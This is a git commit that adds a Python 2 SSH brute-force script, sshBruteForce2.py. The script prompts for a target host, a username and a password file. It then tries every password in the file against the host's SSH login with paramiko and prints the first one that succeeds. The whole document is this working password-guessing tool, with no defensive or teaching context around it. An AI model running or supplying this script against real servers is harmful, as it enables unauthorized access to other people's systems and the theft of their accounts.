1d9c4fcd16c804705f55c261dad28246709835b0
gitithere <takaki.troy@gmail.com>
2017-03-02 15:40:06 -1000

    Create sshBruteForce2.py

---
+++ sshBruteForce2.py
@@ -0,0 +1,58 @@
+import paramiko, sys, os, socket
+global host, username, line, input_file#, numcount
+
+line = '\n-------------------------------------------------------------------\n'
+
+try:
+	host = raw_input("[*] Enter Target Host Address: ")
+	username = raw_input("[*] Enter SSH Username: ")
+	input_file = raw_input("[*] Enter SSH Password File: ")
+
+	if os.path.exists(input_file)  == False:
+		print "\n[*] File Path Does Not Exist!!!"
+		sys.exist(4)
+except KeyboardInterrupt:
+	print "\n\n[*] User Requested An Interrupt"
+	sys.exit(3)
+
+def ssh_connect(password, code = 0):
+	ssh = paramiko.SSHClient()
+	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+	
+	try:
+		ssh.connect(host, port=22, username=username, password=password)
+	except paramiko.AuthenticationException:
+	#	print "[*] Authentication Failed ..."
+		code = 1
+	except socket.error, e:
+	#	print "[*] Connection Failed ... Host Down"
+		code = 2
+	ssh.close
+	return code
+
+input_file = open(input_file)
+print " "
+
+numcount = 0
+numcount = int(numcount)
+for i in input_file.readlines():
+	numcount += 1
+	password = i.strip("\n")
+	try:
+		response = ssh_connect(password)
+	
+		if response == 0:
+			print("%s[+%s] User: %s [+%s] Pass Found: %s%s" % (line, numcount, username, numcount, password, line))
+			sys.exit(0)
+		elif response == 1:
+#			username = str(username)
+#			password = str(password)
+			print "{%s} User: %s {%s} Pass: %s --> Login Incorrect <--" % (numcount, username, numcount, password)
+#			print("[*] User: %s [*] Pass: %s => Login Incorrect !!! <=" % (username, password))
+		elif response == 2:
+			print("[*] Connection Could Not Be Established To Address: %s" % (host))
+			sys.exit(2)
+	except Exception as inst:
+		print type(inst)
+		pass
+input_file.close()
